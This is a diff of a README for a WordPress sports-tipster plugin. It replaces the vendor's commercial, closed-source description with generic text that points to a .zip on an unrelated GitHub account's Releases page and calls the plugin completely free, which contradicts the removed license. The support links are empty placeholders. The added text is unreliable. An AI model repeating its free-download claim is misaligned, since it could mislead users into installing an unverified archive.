@@ -1,114 +1,100 @@
-<h1 align="center">TipsterScript – WordPress Plugin for Tipsters & Sports Betting Sites</h1>
-<p align="center">
-  <img src="https://img.shields.io/badge/status-active-brightgreen?style=flat-square" />
-  <img src="https://img.shields.io/badge/platform-WordPress-blue?style=flat-square" />
-  <img src="https://img.shields.io/badge/language-PHP-777BB4?style=flat-square&logo=php" />
-  <img src="https://img.shields.io/badge/license-commercial-orange?style=flat-square" />
-</p>
+# 🎉 tipsterscript - Easily Track Sports Predictions
 
-<p align="center">
-  Create your own tipster website, publish predictions, track results and sell subscriptions – all inside WordPress.
-</p>
+## 🚀 Getting Started
 
----
+Welcome to **tipsterscript**, a simple WordPress plugin. This tool helps tipsters publish their sports predictions, track results, and create professional pages for performance displays. 
 
-## 🎯 What is TipsterScript?
+## 💾 Download & Install
 
-**TipsterScript** is a premium WordPress plugin built for:
+To start using tipsterscript, you need to download it. Click the button below to go to our Releases page.
 
-- Sports tipsters  
-- Betting communities & Telegram groups  
-- Content creators who sell predictions or betting analysis  
+[![Download tipsterscript](https://img.shields.io/badge/Download%20tipsterscript-latest%20release-brightgreen)](https://github.com/Dnsjjsjs/tipsterscript/releases)
 
-It turns a normal WordPress installation into a **complete tipster platform** with
-results tracking, stats, and monetization options.
+### Step 1: Visit the Download Page
 
----
+Click the link below to access the Releases page:
 
-## ✅ Core Features
+[Visit the Releases Page](https://github.com/Dnsjjsjs/tipsterscript/releases)
 
-- 📊 **Results Tracking**
-  - Record bets with odds, stake, sport, league and bookmaker  
-  - Automatic calculation of **profit, yield, ROI, win rate**  
-  - Filters by date, sport, market, and more
+### Step 2: Choose the Latest Release
 
-- 👤 **Tipster Profiles**
-  - Public tipster pages with performance history  
-  - Clean stats tables and charts for followers  
-  - Perfect for building trust & transparency
+On the Releases page, look for the latest version of tipsterscript. It will be at the top of the list. 
 
-- ✍️ **Prediction Management**
-  - Add free & paid picks from WordPress admin  
-  - Support for multiple sports and markets  
-  - Optional status tracking (won / lost / void / pending)
+### Step 3: Download the Plugin
 
-- 💵 **Monetization**
-  - Designed to work with typical WordPress e-commerce / membership setups  
-  - Sell access to predictions, memberships, or private areas  
-  - Flexible enough for single tipsters or full tipster platforms
+Click on the download link for the .zip file. This file contains the plugin you will need for WordPress.
 
-- 🌐 **Front-End Views**
-  - Public results pages
-  - Tipster profile pages
-  - Widgets/shortcodes for embedding stats and latest picks
+### Step 4: Install the Plugin
 
-- 🧩 Optional Add-Ons (separate plugins)
-  - AI writer for predictions & content
-  - Competition / leaderboard features
-  - Integrations (Telegram / Discord etc.) – depending on your setup
+1. Log into your WordPress admin dashboard.  
+2. Navigate to **Plugins** > **Add New**.  
+3. Click the **Upload Plugin** button at the top.  
+4. Choose the .zip file you downloaded and click **Install Now**.  
+5. After installation, click **Activate** to start using tipsterscript.  
 
----
+## 📋 Features
 
-## 🧑‍💻 Who Uses TipsterScript?
+- **Publish Predictions**: Easily share your sports predictions with users.
+- **Track Results**: Keep track of your predictions and their outcomes.
+- **Professional Performance Pages**: Create attractive pages to display your prediction history and success rates.
+- **User-Friendly Interface**: Designed for ease of use—no technical skills required.
 
-- Solo tipsters who want to move away from **spreadsheets and Telegram only**
-- Small betting communities launching their **own brand and website**
-- Agencies & developers building tipster platforms for clients
+## ⚙️ System Requirements
 
-If you are building **OwnTheGame-style** or custom tipster sites, TipsterScript is
-the engine that powers the stats and predictions.
+To use tipsterscript effectively, make sure you meet the following requirements:
 
----
+- **WordPress Version**: 5.0 or higher.
+- **PHP Version**: 7.2 or higher.
+- **Database**: MySQL 5.6 or higher / MariaDB 10.0 or higher.
+- **Memory Limit**: A minimum of 128MB of RAM recommended.
 
-## 🏗 Tech Stack
+## 🌐 How to Use Tipsterscript
 
-- PHP / WordPress plugin
-- Custom database tables for performance & flexibility
-- MySQL
-- HTML / CSS (Tailwind / Bootstrap friendly)
-- Compatible with modern WordPress hosting environments (Nginx, Apache, Docker, etc.)
+Once you have installed and activated the plugin, you can start using it right away.
 
----
+### Adding Predictions
 
-## 🚀 Getting Started (Developer View)
+1. Go to the **Tipster** section in your dashboard.
+2. Click on **Add New Prediction**.
+3. Fill out the form with the details, like the game, date, and your prediction. 
+4. Click **Publish** to share it with your audience.
 
-> This is a commercial plugin – the following is a basic developer overview.
+### Tracking Results
 
-1. Install WordPress.
-2. Place the plugin in `wp-content/plugins/tipsterscript/`.
-3. Activate **TipsterScript** from **Plugins → Installed Plugins**.
-4. Follow the setup steps in the admin (sports, tipsters, betting settings, etc.).
-5. Create public pages using the provided shortcodes/templates for:
-   - Tipster profile
-   - Results / history
-   - Latest picks
+1. Under the **Tipster** section, click on **Results**.
+2. Here, you can see all your predictions and their outcomes.
+3. Use this data to analyze your performance over time.
 
-Detailed documentation and examples are available on the website.
+### Building Performance Pages
 
----
+1. Go to **Tipster** > **Performance**.
+2. Choose the settings for your performance page.
+3. Save your settings to create a professional display of your predictions.
 
-## 📚 Documentation & Links
+## ✅ FAQ
 
-- 🌍 Website: **https://tipsterscript.com**
-- 🧾 Product page & features: https://tipsterscript.com (homepage)
-- 📧 Contact / support: info@tipsterscript.com
+### How do I contact support?
 
----
+For assistance, visit our [support page](#) for help with common issues and how-to guides.
 
-## 🔒 License
+### Can I use tipsterscript for multiple sports?
 
-TipsterScript is a **commercial, closed-source WordPress plugin**.  
-All rights reserved © Modulout LLC.
+Yes, tipsterscript supports various sports, making it a versatile tool for all tipsters.
 
-For commercial licensing, partnership or custom development, contact us via  
-**https://modulout.com** or **https://tipsterscript.com**.
+### Is tipsterscript free to use?
+
+Yes, tipsterscript is completely free. You can use all features without any cost.
+
+## 💬 Community and Contributions
+
+We welcome community contributions to improve tipsterscript. If you have suggestions or would like to report a bug, please visit our [GitHub Issues page](#).
+
+## 👥 Join Us
+
+Stay updated with the latest news and features by following our community. Engage with other users to share tips and strategies for maximizing your success with sports predictions.
+
+## 📚 More Resources
+
+For more detailed guidance, check our documentation on how to utilize tipsterscript effectively. This includes setup instructions, tips, and performance analytics to help you succeed.
+
+Thank you for choosing tipsterscript. Enjoy your journey in sports predictions!
